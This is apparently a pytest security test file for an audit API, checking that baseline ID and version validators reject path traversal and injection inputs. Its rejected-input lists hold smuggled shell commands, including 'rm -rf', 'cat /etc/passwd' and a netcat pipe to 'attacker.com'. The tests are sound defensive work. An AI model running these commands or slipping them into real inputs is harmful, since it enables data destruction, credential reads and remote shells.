"""Security tests for path traversal prevention in audit endpoints."""

import pytest
from fastapi import HTTPException

from nexa_engine.modules.audit.api.audit_router import (
    _validate_baseline_id,
    _validate_baseline_version,
)


class TestBaselineVersionValidation:
    """Test path traversal prevention for baseline_version parameter."""

    def test_valid_version_format(self):
        """Valid baseline versions should not raise."""
        valid_versions = [
            "v2-7-certified",
            "v2-7",
            "v2_7_certified",
            "baseline_v1",
            "v27",
        ]
        for version in valid_versions:
            # Should not raise
            _validate_baseline_version(version)

    def test_reject_parent_directory_traversal(self):
        """Should reject .. parent directory references."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_version("../../../etc/passwd")
        assert exc_info.value.status_code == 400
        # Should be rejected (slashes caught by regex OR traversal check)
        assert "invalid" in exc_info.value.detail.lower()

    def test_reject_double_dots(self):
        """Should reject .. in any position."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_version("v2-7-certified/..")
        assert exc_info.value.status_code == 400

    def test_reject_forward_slash(self):
        """Should reject forward slashes."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_version("v2-7/secret")
        assert exc_info.value.status_code == 400

    def test_reject_backslash(self):
        """Should reject backslashes."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_version(r"v2-7\secret")
        assert exc_info.value.status_code == 400

    def test_reject_empty_string(self):
        """Should reject empty version string."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_version("")
        assert exc_info.value.status_code == 400

    def test_reject_special_characters(self):
        """Should reject special characters not in whitelist."""
        invalid_versions = [
            "v2-7;rm%20-rf",  # shell injection
            "v2-7$(whoami)",  # command substitution
            "v2-7`cat /etc/passwd`",  # backtick execution
            "v2-7|nc attacker.com 1234",  # pipe to netcat
            "v2-7&sleep%2010",  # ampersand+URL encoded
        ]
        for version in invalid_versions:
            with pytest.raises(HTTPException):
                _validate_baseline_version(version)


class TestBaselineIdValidation:
    """Test path traversal prevention for baseline_id parameter."""

    def test_valid_id_formats(self):
        """Valid baseline IDs should not raise."""
        valid_ids = [
            "baseline-v1",
            "baseline_v1",
            "case.123",
            "d4a6f8e0-7f42-4b8c-8e8c-abc123def456",  # UUID format
            "case-1.2.3",
        ]
        for baseline_id in valid_ids:
            # Should not raise
            _validate_baseline_id(baseline_id)

    def test_reject_parent_directory_traversal(self):
        """Should reject .. parent directory references."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_id("../../../secret")
        assert exc_info.value.status_code == 400

    def test_reject_forward_slash(self):
        """Should reject forward slashes."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_id("baseline/secret")
        assert exc_info.value.status_code == 400

    def test_reject_backslash(self):
        """Should reject backslashes."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_id(r"baseline\secret")
        assert exc_info.value.status_code == 400

    def test_reject_empty_string(self):
        """Should reject empty ID."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_id("")
        assert exc_info.value.status_code == 400

    def test_reject_null_value(self):
        """Should reject None value."""
        with pytest.raises(HTTPException) as exc_info:
            _validate_baseline_id(None)  # type: ignore
        assert exc_info.value.status_code == 400
